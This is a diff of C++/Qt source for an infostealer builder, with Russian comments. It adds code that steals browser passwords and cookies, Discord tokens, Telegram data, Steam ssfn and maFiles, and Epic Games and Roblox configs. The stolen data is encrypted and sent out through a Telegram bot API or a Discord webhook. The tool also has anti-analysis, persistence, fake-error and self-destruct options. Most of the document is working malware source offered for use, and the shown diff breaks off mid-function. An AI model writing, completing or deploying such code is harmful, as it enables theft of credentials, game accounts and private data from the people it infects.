@@ -30,6 +30,7 @@
 #include <QFileDialog>
 #include <QMessageBox>
 #include <QSettings>
+#include <QVBoxLayout> // Добавлено для исправления ошибки 3
 #include <mutex>
 #include <thread>
 #include <memoryapi.h>
@@ -39,6 +40,7 @@
 #include "build_key.h"
 #include "polymorphic_code.h"
 #include "junk_code.h"
+#include "workerthread.h" // Добавлено для исправления ошибки 5
 
 // Определение NT_SUCCESS, если он отсутствует
 #ifndef NT_SUCCESS
@@ -73,79 +75,6 @@ void Log(const QString& message) {
         g_mainWindow->emitLog(message);
     }
     std::cout << message.toStdString() << std::endl;
-}
-
-// Реализация функций из build_key.h
-std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& key) {
-    std::array<unsigned char, 16> result{};
-    if (key.empty()) {
-        Log(QString("Encryption key is empty, using default"));
-        return result;
-    }
-
-    // Используем SHA-256 для генерации ключа из строки
-    BCRYPT_ALG_HANDLE hAlg = nullptr;
-    BCRYPT_HASH_HANDLE hHash = nullptr;
-    NTSTATUS status;
-
-    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0);
-    if (!BCRYPT_SUCCESS(status)) {
-        Log(QString::fromStdString("Failed to open SHA256 algorithm provider: " + std::to_string(status)));
-        return result;
-    }
-
-    status = BCryptCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0);
-    if (!BCRYPT_SUCCESS(status)) {
-        BCryptCloseAlgorithmProvider(hAlg, 0);
-        Log(QString::fromStdString("Failed to create hash object: " + std::to_string(status)));
-        return result;
-    }
-
-    status = BCryptHashData(hHash, (PUCHAR)key.data(), key.size(), 0);
-    if (!BCRYPT_SUCCESS(status)) {
-        BCryptDestroyHash(hHash);
-        BCryptCloseAlgorithmProvider(hAlg, 0);
-        Log(QString::fromStdString("Failed to hash key: " + std::to_string(status)));
-        return result;
-    }
-
-    std::array<unsigned char, 32> hash;
-    status = BCryptFinishHash(hHash, hash.data(), hash.size(), 0);
-    if (!BCRYPT_SUCCESS(status)) {
-        BCryptDestroyHash(hHash);
-        BCryptCloseAlgorithmProvider(hAlg, 0);
-        Log(QString::fromStdString("Failed to finish hash: " + std::to_string(status)));
-        return result;
-    }
-
-    BCryptDestroyHash(hHash);
-    BCryptCloseAlgorithmProvider(hAlg, 0);
-
-    // Берем первые 16 байт из хэша
-    std::copy(hash.begin(), hash.begin() + 16, result.begin());
-    return result;
-}
-
-std::array<unsigned char, 16> GenerateIV() {
-    std::array<unsigned char, 16> iv{};
-    BCRYPT_ALG_HANDLE hAlg = nullptr;
-    NTSTATUS status;
-
-    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, nullptr, 0);
-    if (!BCRYPT_SUCCESS(status)) {
-        Log(QString::fromStdString("Failed to open RNG algorithm provider: " + std::to_string(status)));
-        return iv;
-    }
-
-    status = BCryptGenRandom(hAlg, iv.data(), iv.size(), 0);
-    if (!BCRYPT_SUCCESS(status)) {
-        BCryptCloseAlgorithmProvider(hAlg, 0);
-        Log(QString::fromStdString("Failed to generate IV: " + std::to_string(status)));
-        return iv;
-    }
-
-    BCryptCloseAlgorithmProvider(hAlg, 0);
-    return iv;
 }
 
 // Реализация шифрования данных
@@ -1146,6 +1075,7 @@ MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWi
     silentCheckBox = new QCheckBox("Silent Mode", this);
     autoStartCheckBox = new QCheckBox("Auto Start", this);
     persistCheckBox = new QCheckBox("Persist", this);
+    selfDestructCheckBox = new QCheckBox("Self Destruct", this); // Добавлено для полноты конфигурации
     textEdit = new QTextEdit(this);
     iconBrowseButton = new QPushButton("Browse Icon", this);
     buildButton = new QPushButton("Build", this);
@@ -1161,7 +1091,7 @@ MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWi
     buildTimer = new QTimer(this);
     statusCheckTimer = new QTimer(this);
 
-    // Настройка UI (упрощенно)
+    // Настройка UI
     QVBoxLayout* layout = new QVBoxLayout;
     layout->addWidget(new QLabel("Telegram Token:"));
     layout->addWidget(tokenLineEdit);
@@ -1208,6 +1138,7 @@ MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWi
     layout->addWidget(silentCheckBox);
     layout->addWidget(autoStartCheckBox);
     layout->addWidget(persistCheckBox);
+    layout->addWidget(selfDestructCheckBox);
     layout->addWidget(textEdit);
     layout->addWidget(buildButton);
 
@@ -1224,6 +1155,14 @@ MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWi
     connect(buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
     connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
     connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
+    connect(buildTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
+    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
+
+    // Инициализация глобальной переменной
+    g_mainWindow = this;
+
+    // Загрузка конфигурации
+    loadConfig();
 }
 
 MainWindow::~MainWindow() {
@@ -1235,6 +1174,10 @@ MainWindow::~MainWindow() {
 
 void MainWindow::emitLog(const QString& message) {
     emit logUpdated(message);
+}
+
+void MainWindow::appendLog(const QString& message) {
+    textEdit->append(message);
 }
 
 std::string MainWindow::generateRandomString(size_t length) {
@@ -1301,9 +1244,155 @@ void MainWindow::updateConfigFromUI() {
     config.silent = silentCheckBox->isChecked();
     config.autoStart = autoStartCheckBox->isChecked();
     config.persist = persistCheckBox->isChecked();
+    config.selfDestruct = selfDestructCheckBox->isChecked();
     config.sendToTelegram = (config.sendMethod == "Telegram");
     config.sendToDiscord = (config.sendMethod == "Discord");
     config.sendToServer = (config.sendMethod == "Local File");
+}
+
+void MainWindow::saveConfig() {
+    QSettings settings("MyApp", "Config");
+    settings.setValue("telegramBotToken", QString::fromStdString(config.telegramBotToken));
+    settings.setValue("telegramChatId", QString::fromStdString(config.telegramChatId));
+    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
+    settings.setValue("filename", QString::fromStdString(config.filename));
+    settings.setValue("encryptionKey1", QString::fromStdString(config.encryptionKey1));
+    settings.setValue("encryptionKey2", QString::fromStdString(config.encryptionKey2));
+    settings.setValue("encryptionSalt", QString::fromStdString(config.encryptionSalt));
+    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
+    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
+    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
+    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
+    settings.setValue("buildMethod", QString::fromStdString(config.buildMethod));
+    settings.setValue("steam", config.steam);
+    settings.setValue("steamMAFile", config.steamMAFile);
+    settings.setValue("epic", config.epic);
+    settings.setValue("roblox", config.roblox);
+    settings.setValue("battlenet", config.battlenet);
+    settings.setValue("minecraft", config.minecraft);
+    settings.setValue("discord", config.discord);
+    settings.setValue("telegram", config.telegram);
+    settings.setValue("chatHistory", config.chatHistory);
+    settings.setValue("cookies", config.cookies);
+    settings.setValue("passwords", config.passwords);
+    settings.setValue("screenshot", config.screenshot);
+    settings.setValue("fileGrabber", config.fileGrabber);
+    settings.setValue("systemInfo", config.systemInfo);
+    settings.setValue("socialEngineering", config.socialEngineering);
+    settings.setValue("antiVM", config.antiVM);
+    settings.setValue("fakeError", config.fakeError);
+    settings.setValue("silent", config.silent);
+    settings.setValue("autoStart", config.autoStart);
+    settings.setValue("persist", config.persist);
+    settings.setValue("selfDestruct", config.selfDestruct);
+    Log(QString("Configuration saved"));
+}
+
+void MainWindow::loadConfig() {
+    QSettings settings("MyApp", "Config");
+    config.telegramBotToken = settings.value("telegramBotToken", "").toString().toStdString();
+    config.telegramChatId = settings.value("telegramChatId", "").toString().toStdString();
+    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
+    config.filename = settings.value("filename", "output.exe").toString().toStdString();
+    config.encryptionKey1 = settings.value("encryptionKey1", generateRandomString(16)).toString().toStdString();
+    config.encryptionKey2 = settings.value("encryptionKey2", generateRandomString(16)).toString().toStdString();
+    config.encryptionSalt = settings.value("encryptionSalt", generateRandomString(16)).toString().toStdString();
+    config.iconPath = settings.value("iconPath", "").toString().toStdString();
+    config.githubToken = settings.value("githubToken", "").toString().toStdString();
+    config.githubRepo = settings.value("githubRepo", "").toString().toStdString();
+    config.sendMethod = settings.value("sendMethod", "Local File").toString().toStdString();
+    config.buildMethod = settings.value("buildMethod", "Local Build").toString().toStdString();
+    config.steam = settings.value("steam", false).toBool();
+    config.steamMAFile = settings.value("steamMAFile", false).toBool();
+    config.epic = settings.value("epic", false).toBool();
+    config.roblox = settings.value("roblox", false).toBool();
+    config.battlenet = settings.value("battlenet", false).toBool();
+    config.minecraft = settings.value("minecraft", false).toBool();
+    config.discord = settings.value("discord", false).toBool();
+    config.telegram = settings.value("telegram", false).toBool();
+    config.chatHistory = settings.value("chatHistory", false).toBool();
+    config.cookies = settings.value("cookies", false).toBool();
+    config.passwords = settings.value("passwords", false).toBool();
+    config.screenshot = settings.value("screenshot", false).toBool();
+    config.fileGrabber = settings.value("fileGrabber", false).toBool();
+    config.systemInfo = settings.value("systemInfo", false).toBool();
+    config.socialEngineering = settings.value("socialEngineering", false).toBool();
+    config.antiVM = settings.value("antiVM", false).toBool();
+    config.fakeError = settings.value("fakeError", false).toBool();
+    config.silent = settings.value("silent", false).toBool();
+    config.autoStart = settings.value("autoStart", false).toBool();
+    config.persist = settings.value("persist", false).toBool();
+    config.selfDestruct = settings.value("selfDestruct", false).toBool();
+
+    // Обновление UI
+    tokenLineEdit->setText(QString::fromStdString(config.telegramBotToken));
+    chatIdLineEdit->setText(QString::fromStdString(config.telegramChatId));
+    discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
+    fileNameLineEdit->setText(QString::fromStdString(config.filename));
+    encryptionKey1LineEdit->setText(QString::fromStdString(config.encryptionKey1));
+    encryptionKey2LineEdit->setText(QString::fromStdString(config.encryptionKey2));
+    encryptionSaltLineEdit->setText(QString::fromStdString(config.encryptionSalt));
+    iconPathLineEdit->setText(QString::fromStdString(config.iconPath));
+    githubTokenLineEdit->setText(QString::fromStdString(config.githubToken));
+    githubRepoLineEdit->setText(QString::fromStdString(config.githubRepo));
+    sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
+    buildMethodComboBox->setCurrentText(QString::fromStdString(config.buildMethod));
+    steamCheckBox->setChecked(config.steam);
+    steamMAFileCheckBox->setChecked(config.steamMAFile);
+    epicCheckBox->setChecked(config.epic);
+    robloxCheckBox->setChecked(config.roblox);
+    battlenetCheckBox->setChecked(config.battlenet);
+    minecraftCheckBox->setChecked(config.minecraft);
+    discordCheckBox->setChecked(config.discord);
+    telegramCheckBox->setChecked(config.telegram);
+    chatHistoryCheckBox->setChecked(config.chatHistory);
+    cookiesCheckBox->setChecked(config.cookies);
+    passwordsCheckBox->setChecked(config.passwords);
+    screenshotCheckBox->setChecked(config.screenshot);
+    fileGrabberCheckBox->setChecked(config.fileGrabber);
+    systemInfoCheckBox->setChecked(config.systemInfo);
+    socialEngineeringCheckBox->setChecked(config.socialEngineering);
+    antiVMCheckBox->setChecked(config.antiVM);
+    fakeErrorCheckBox->setChecked(config.fakeError);
+    silentCheckBox->setChecked(config.silent);
+    autoStartCheckBox->setChecked(config.autoStart);
+    persistCheckBox->setChecked(config.persist);
+    selfDestructCheckBox->setChecked(config.selfDestruct);
+
+    Log(QString("Configuration loaded"));
+}
+
+void MainWindow::exportLogs() {
+    QString fileName = QFileDialog::getSaveFileName(this, "Export Logs", "", "Text Files (*.txt)");
+    if (fileName.isEmpty()) return;
+
+    QFile file(fileName);
+    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
+        QTextStream out(&file);
+        out << textEdit->toPlainText();
+        file.close();
+        Log(QString("Logs exported to: ") + fileName);
+    } else {
+        Log(QString("Failed to export logs to: ") + fileName);
+    }
+}
+
+void MainWindow::on_iconBrowseButton_clicked() {
+    QString fileName = QFileDialog::getOpenFileName(this, "Select Icon", "", "Icon Files (*.ico)");
+    if (!fileName.isEmpty()) {
+        iconPathLineEdit->setText(fileName);
+        config.iconPath = fileName.toStdString();
+        Log(QString("Icon selected: ") + fileName);
+    }
+}
+
+void MainWindow::on_buildButton_clicked() {
+    updateConfigFromUI();
+    if (config.buildMethod == "Local Build") {
+        buildExecutable();
+    } else if (config.buildMethod == "GitHub Actions") {
+        triggerGitHubActions();
+    }
 }
 
 void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
@@ -1323,16 +1412,128 @@ void MainWindow::sendData(const QString& encryptedData, const std::vector<std::s
     }
 }
 
-void MainWindow::generatePolymorphicCode() {
-    // Реализация генерации полиморфного кода
-    std::string polyCode = "void polymorphic_function() {\n";
-    polyCode += "    int x = " + std::to_string(rand() % 100) + ";\n";
-    polyCode += "    int y = " + std::to_string(rand() % 100) + ";\n";
-    polyCode += "    if (x > y) {\n";
-    polyCode += "        x = x ^ y;\n";
-    polyCode += "    }\n";
-    polyCode += "}\n";
+void MainWindow::sendDataToServer(const std::string& encryptedData, const std::vector<std::string>& files) {
+    std::string outputDir = "output";
+    std::filesystem::create_directory(outputDir);
 
+    std::string dataFile = outputDir + "\\data_" + std::to_string(GetTickCount()) + ".txt";
+    std::ofstream outFile(dataFile);
+    if (outFile.is_open()) {
+        outFile << encryptedData;
+        outFile.close();
+        Log(QString::fromStdString("Data saved to: " + dataFile));
+    } else {
+        Log(QString::fromStdString("Failed to save data to: " + dataFile));
+    }
+
+    for (const auto& file : files) {
+        std::string destPath = outputDir + "\\" + std::filesystem::path(file).filename().string();
+        try {
+            std::filesystem::copy_file(file, destPath, std::filesystem::copy_options::overwrite_existing);
+            Log(QString::fromStdString("File copied to: " + destPath));
+        } catch (const std::exception& e) {
+            Log(QString::fromStdString("Failed to copy file " + file + ": " + e.what()));
+        }
+    }
+}
+
+void MainWindow::sendToTelegram(const std::string& encryptedData, const std::vector<std::string>& files) {
+    if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
+        Log(QString("Telegram bot token or chat ID not specified"));
+        return;
+    }
+
+    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
+
+    // Добавление текстовых данных
+    if (!encryptedData.empty()) {
+        QHttpPart textPart;
+        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"document\"; filename=\"data.txt\""));
+        textPart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("text/plain"));
+        textPart.setBody(QByteArray(encryptedData.c_str(), encryptedData.size()));
+        multiPart->append(textPart);
+    }
+
+    // Добавление файлов
+    for (const auto& filePath : files) {
+        QFile* file = new QFile(QString::fromStdString(filePath));
+        if (file->open(QIODevice::ReadOnly)) {
+            QHttpPart filePart;
+            filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
+                               QVariant("form-data; name=\"document\"; filename=\"" + QString::fromStdString(std::filesystem::path(filePath).filename().string()) + "\""));
+            filePart.setBodyDevice(file);
+            file->setParent(multiPart);
+            multiPart->append(filePart);
+        } else {
+            Log(QString::fromStdString("Failed to open file for Telegram: " + filePath));
+            delete file;
+        }
+    }
+
+    QNetworkRequest request(QUrl(QString("https://api.telegram.org/bot%1/sendDocument?chat_id=%2")
+                                 .arg(QString::fromStdString(config.telegramBotToken))
+                                 .arg(QString::fromStdString(config.telegramChatId))));
+    QNetworkReply* reply = manager->post(request, multiPart);
+    multiPart->setParent(reply);
+
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() { // Исправлено для ошибки 6
+        replyFinished(reply);
+    });
+}
+
+void MainWindow::sendToDiscord(const std::string& encryptedData, const std::vector<std::string>& files) {
+    if (config.discordWebhook.empty()) {
+        Log(QString("Discord webhook not specified"));
+        return;
+    }
+
+    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
+
+    // Добавление текстовых данных
+    if (!encryptedData.empty()) {
+        QHttpPart textPart;
+        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"data.txt\""));
+        textPart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("text/plain"));
+        textPart.setBody(QByteArray(encryptedData.c_str(), encryptedData.size()));
+        multiPart->append(textPart);
+    }
+
+    // Добавление файлов
+    for (const auto& filePath : files) {
+        QFile* file = new QFile(QString::fromStdString(filePath));
+        if (file->open(QIODevice::ReadOnly)) {
+            QHttpPart filePart;
+            filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
+                               QVariant("form-data; name=\"file\"; filename=\"" + QString::fromStdString(std::filesystem::path(filePath).filename().string()) + "\""));
+            filePart.setBodyDevice(file);
+            file->setParent(multiPart);
+            multiPart->append(filePart);
+        } else {
+            Log(QString::fromStdString("Failed to open file for Discord: " + filePath));
+            delete file;
+        }
+    }
+
+    QNetworkRequest request(QUrl(QString::fromStdString(config.discordWebhook)));
+    QNetworkReply* reply = manager->post(request, multiPart);
+    multiPart->setParent(reply);
+
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() { // Исправлено для ошибки 6
+        replyFinished(reply);
+    });
+}
+
+void MainWindow::replyFinished(QNetworkReply* reply) {
+    if (reply->error() == QNetworkReply::NoError) {
+        Log(QString("Data sent successfully"));
+    } else {
+        Log(QString("Failed to send data: ") + reply->errorString());
+    }
+    reply->deleteLater();
+}
+
+void MainWindow::generatePolymorphicCode() {
+    std::string polyCode = GeneratePolymorphicCode();
     std::ofstream outFile("polymorphic_code.h");
     if (outFile.is_open()) {
         outFile << polyCode;
@@ -1389,7 +1590,7 @@ void MainWindow::buildExecutable() {
     generateBuildKeyHeader();
     copyIconToBuild();
 
-    // Имитация сборки
+    // Имитация сборки (в реальном проекте здесь будет вызов компилятора)
     QTimer::singleShot(2000, this, [this]() {
         Log(QString("Build completed: ") + QString::fromStdString(config.filename));
         isBuilding = false;
@@ -1414,7 +1615,12 @@ void MainWindow::triggerGitHubActions() {
     QByteArray data = doc.toJson();
 
     QNetworkReply* reply = manager->post(request, data);
-    connect(reply, &QNetworkReply::finished, this, &MainWindow::replyFinished);
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
+        replyFinished(reply);
+        if (reply->error() == QNetworkReply::NoError) {
+            statusCheckTimer->start(30000); // Проверять статус каждые 30 секунд
+        }
+    });
 }
 
 void MainWindow::checkBuildStatus() {
@@ -1428,20 +1634,169 @@ void MainWindow::checkBuildStatus() {
     request.setRawHeader("Accept", "application/vnd.github.v3+json");
 
     QNetworkReply* reply = manager->get(request);
-    connect(reply, &QNetworkReply::finished, this, &MainWindow::replyFinished);
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
+        if (reply->error() == QNetworkReply::NoError) {
+            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
+            QJsonObject obj = doc.object();
+            QString status = obj["status"].toString();
+            QString conclusion = obj["conclusion"].toString();
+            Log(QString("Build status: ") + status + ", conclusion: " + conclusion);
+            if (status == "completed") {
+                statusCheckTimer->stop();
+                if (conclusion == "success") {
+                    emit startStealSignal();
+                }
+            }
+        } else {
+            Log(QString("Failed to check build status: ") + reply->errorString());
+        }
+        reply->deleteLater();
+    });
 }
 
 void MainWindow::startStealProcess() {
+    if (AntiAnalysis()) {
+        Log(QString("Anti-analysis checks failed, exiting"));
+        QApplication::quit();
+        return;
+    }
+
+    Stealth();
+    Persist();
+    FakeError();
+
     std::string tempDir = std::filesystem::temp_directory_path().string() + "\\stolen_data_" + std::to_string(GetTickCount());
     std::filesystem::create_directory(tempDir);
     StealAndSendData(tempDir);
+
+    SelfDestruct();
 }
 
-void MainWindow::stealDiscordTokens() {
-    std::string tokens = StealDiscordTokens("temp");
-    if (!tokens.empty()) {
-        collectedData += "[Discord Tokens]\n" + tokens + "\n";
+void MainWindow::StealAndSendData(const std::string& dir) {
+    collectedData.clear();
+    collectedFiles.clear();
+
+    // Сбор системной информации
+    if (config.systemInfo) {
+        std::string sysInfo = GetCustomSystemInfo();
+        if (!sysInfo.empty()) {
+            collectedData += "[System Info]\n" + sysInfo + "\n";
+        }
     }
+
+    // Создание скриншота
+    if (config.screenshot) {
+        std::string screenshotPath = TakeScreenshot(dir);
+        if (!screenshotPath.empty()) {
+            collectedFiles.push_back(screenshotPath);
+        }
+    }
+
+    // Кража данных браузеров
+    if (config.cookies || config.passwords) {
+        std::string browserData = stealBrowserData(dir);
+        if (!browserData.empty()) {
+            collectedData += "[Browser Data]\n" + browserData + "\n";
+        }
+    }
+
+    // Кража токенов Discord
+    if (config.discord) {
+        std::string discordTokens = StealDiscordTokens(dir);
+        if (!discordTokens.empty()) {
+            collectedData += "[Discord Tokens]\n" + discordTokens + "\n";
+        }
+
+        std::string discordCache = StealAppCacheData("Discord", dir + "\\Discord_Cache");
+        if (!discordCache.empty()) {
+            collectedData += "[Discord Cache]\n" + discordCache + "\n";
+        }
+    }
+
+    // Кража данных Telegram
+    if (config.telegram) {
+        std::string telegramData = StealTelegramData(dir);
+        if (!telegramData.empty()) {
+            collectedData += "[Telegram Data]\n" + telegramData + "\n";
+        }
+    }
+
+    // Кража данных Steam
+    if (config.steam || config.steamMAFile) {
+        std::string steamData = StealSteamData(dir);
+        if (!steamData.empty()) {
+            collectedData += "[Steam Data]\n" + steamData + "\n";
+        }
+    }
+
+    // Кража данных Epic Games
+    if (config.epic) {
+        std::string epicData = StealEpicGamesData(dir);
+        if (!epicData.empty()) {
+            collectedData += "[Epic Games Data]\n" + epicData + "\n";
+        }
+    }
+
+    // Кража данных Roblox
+    if (config.roblox) {
+        std::string robloxData = StealRobloxData(dir);
+        if (!robloxData.empty()) {
+            collectedData += "[Roblox Data]\n" + robloxData + "\n";
+        }
+    }
+
+    // Кража данных Battle.net
+    if (config.battlenet) {
+        std::string battlenetData = StealBattleNetData(dir);
+        if (!battlenetData.empty()) {
+            collectedData += "[Battle.net Data]\n" + battlenetData + "\n";
+        }
+    }
+
+    // Кража данных Minecraft
+    if (config.minecraft) {
+        std::string minecraftData = StealMinecraftData(dir);
+        if (!minecraftData.empty()) {
+            collectedData += "[Minecraft Data]\n" + minecraftData + "\n";
+        }
+    }
+
+    // Захват WebSocket и WebRTC сессий
+    if (config.discord || config.telegram) {
+        std::vector<std::string> processes = {"Discord.exe", "Telegram.exe"};
+        for (const auto& process : processes) {
+            std::string wsData = CaptureWebSocketSessions(process);
+            if (!wsData.empty()) {
+                collectedData += "[WebSocket Sessions - " + process + "]\n" + wsData + "\n";
+            }
+
+            std::string webrtcData = CaptureWebRTCSessions(process);
+            if (!webrtcData.empty()) {
+                collectedData += "[WebRTC Sessions - " + process + "]\n" + webrtcData + "\n";
+            }
+        }
+    }
+
+    // Кража файлов
+    if (config.fileGrabber) {
+        std::vector<std::string> grabbedFiles = GrabFiles(dir);
+        collectedFiles.insert(collectedFiles.end(), grabbedFiles.begin(), grabbedFiles.end());
+    }
+
+    // Шифрование собранных данных
+    std::string encryptedData;
+    if (!collectedData.empty()) {
+        try {
+            encryptedData = EncryptData(collectedData, config.encryptionKey1, config.encryptionKey2, config.encryptionSalt);
+            Log(QString("Data encrypted successfully"));
+        } catch (const std::exception& e) {
+            Log(QString::fromStdString("Failed to encrypt data: " + std::string(e.what())));
+            return;
+        }
+    }
+
+    // Отправка данных
+    sendData(QString::fromStdString(encryptedData), collectedFiles);
 }
 
 std::string MainWindow::stealBrowserData(const std::string& dir) {
@@ -1637,45 +1992,56 @@ std::string MainWindow::StealSteamData(const std::string& dir) {
         return result;
     }
 
-    // Кража SSFN файлов
+    // Кража конфигурационных файлов Steam
     if (config.steam) {
-        try {
-            for (const auto& entry : std::filesystem::directory_iterator(steamDir)) {
-                if (entry.path().filename().string().find("ssfn") != std::string::npos) {
-                    std::string destFile = dir + "\\" + entry.path().filename().string();
-                    std::filesystem::copy_file(entry.path(), destFile);
-                    result += "Steam SSFN File: " + entry.path().filename().string() + "\n";
-                    Log(QString::fromStdString("Copied Steam SSFN file: " + destFile));
+        std::vector<std::string> steamFiles = {"config\\loginusers.vdf", "config\\config.vdf"};
+        for (const auto& file : steamFiles) {
+            std::string filePath = steamDir + "\\" + file;
+            if (std::filesystem::exists(filePath)) {
+                std::ifstream inFile(filePath);
+                if (inFile.is_open()) {
+                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+                    inFile.close();
+                    result += "Steam File (" + file + "):\n" + content + "\n";
+
+                    std::string destPath = dir + "\\Steam_" + std::filesystem::path(file).filename().string();
+                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
+                    collectedFiles.push_back(destPath);
+                    Log(QString::fromStdString("Steam file copied: " + filePath));
+                } else {
+                    Log(QString::fromStdString("Failed to open Steam file: " + filePath));
                 }
             }
-        } catch (const std::exception& e) {
-            Log(QString::fromStdString("Error in StealSteamData (SSFN): " + std::string(e.what())));
         }
     }
 
-    // Кража MA файлов
+    // Кража MA файлов Steam
     if (config.steamMAFile) {
-        std::string configDir = steamDir + "\\config\\";
-        if (std::filesystem::exists(configDir)) {
-            try {
-                for (const auto& entry : std::filesystem::directory_iterator(configDir)) {
-                    if (entry.path().filename().string().find("maFile") != std::string::npos) {
-                        std::string destFile = dir + "\\" + entry.path().filename().string();
-                        std::filesystem::copy_file(entry.path(), destFile);
-                        result += "Steam MA File: " + entry.path().filename().string() + "\n";
-                        Log(QString::fromStdString("Copied Steam MA file: " + destFile));
-                    }
-                }
-            } catch (const std::exception& e) {
-                Log(QString::fromStdString("Error in StealSteamData (MA Files): " + std::string(e.what())));
+        std::string ssfnPath = steamDir + "\\";
+        for (const auto& entry : std::filesystem::directory_iterator(ssfnPath)) {
+            if (entry.path().filename().string().find("ssfn") != std::string::npos) {
+                std::string filePath = entry.path().string();
+                std::string destPath = dir + "\\" + entry.path().filename().string();
+                std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
+                collectedFiles.push_back(destPath);
+                result += "Steam SSFN File: " + entry.path().filename().string() + "\n";
+                Log(QString::fromStdString("Steam SSFN file copied: " + filePath));
             }
         }
-    }
 
-    // Захват WebSocket сессий Steam
-    std::string wsData = CaptureWebSocketSessions("Steam.exe");
-    if (!wsData.empty()) {
-        result += wsData + "\n";
+        std::string maFilesPath = steamDir + "\\config\\maFiles\\";
+        if (std::filesystem::exists(maFilesPath)) {
+            for (const auto& entry : std::filesystem::directory_iterator(maFilesPath)) {
+                if (entry.path().extension() == ".maFile") {
+                    std::string filePath = entry.path().string();
+                    std::string destPath = dir + "\\Steam_" + entry.path().filename().string();
+                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
+                    collectedFiles.push_back(destPath);
+                    result += "Steam MA File: " + entry.path().filename().string() + "\n";
+                    Log(QString::fromStdString("Steam MA file copied: " + filePath));
+                }
+            }
+        }
     }
 
     return result;
@@ -1702,8 +2068,9 @@ std::string MainWindow::StealEpicGamesData(const std::string& dir) {
 
     try {
         for (const auto& entry : std::filesystem::recursive_directory_iterator(epicPath)) {
-            if (entry.path().filename().string().find("webcache") != std::string::npos) {
-                std::ifstream file(entry.path(), std::ios::binary);
+            if (entry.path().filename().string().find("Config") != std::string::npos ||
+                entry.path().extension() == ".ini") {
+                std::ifstream file(entry.path());
                 if (!file.is_open()) {
                     Log(QString::fromStdString("Failed to open Epic Games file: " + entry.path().string()));
                     continue;
@@ -1711,23 +2078,14 @@ std::string MainWindow::StealEpicGamesData(const std::string& dir) {
 
                 std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                 file.close();
+                result += "Epic Games File (" + entry.path().filename().string() + "):\n" + content + "\n";
 
-                std::regex tokenRegex("[a-zA-Z0-9]{32}");
-                std::smatch match;
-                std::string::const_iterator searchStart(content.cbegin());
-                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
-                    result += "Epic Games Token: " + match[0].str() + "\n";
-                    searchStart = match.suffix().first;
-                }
+                std::string destPath = dir + "\\EpicGames_" + entry.path().filename().string();
+                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
+                collectedFiles.push_back(destPath);
+                Log(QString::fromStdString("Epic Games file copied: " + entry.path().string()));
             }
         }
-
-        // Копирование данных Epic Games
-        std::string epicDest = dir + "\\EpicGames_Data";
-        std::filesystem::create_directory(epicDest);
-        std::filesystem::copy(epicPath, epicDest, std::filesystem::copy_options::recursive);
-        result += "Epic Games Data Copied to: " + epicDest + "\n";
-        Log(QString::fromStdString("Epic Games data copied to: " + epicDest));
     } catch (const std::exception& e) {
         Log(QString::fromStdString("Error in StealEpicGamesData: " + std::string(e.what())));
     }
@@ -1748,44 +2106,51 @@ std::string MainWindow::StealRobloxData(const std::string& dir) {
     std::string localAppData(localAppDataPath);
     free(localAppDataPath);
 
-    std::string robloxPath = localAppData + "\\Roblox\\LocalStorage\\";
+    std::string robloxPath = localAppData + "\\Roblox\\";
     if (!std::filesystem::exists(robloxPath)) {
         Log(QString::fromStdString("Roblox path not found: " + robloxPath));
         return result;
     }
 
     try {
-        for (const auto& entry : std::filesystem::directory_iterator(robloxPath)) {
-            std::ifstream file(entry.path(), std::ios::binary);
-            if (!file.is_open()) {
-                Log(QString::fromStdString("Failed to open Roblox file: " + entry.path().string()));
-                continue;
-            }
+        for (const auto& entry : std::filesystem::recursive_directory_iterator(robloxPath)) {
+            if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos ||
+                entry.path().extension() == ".ini") {
+                std::ifstream file(entry.path());
+                if (!file.is_open()) {
+                    Log(QString::fromStdString("Failed to open Roblox file: " + entry.path().string()));
+                    continue;
+                }
 
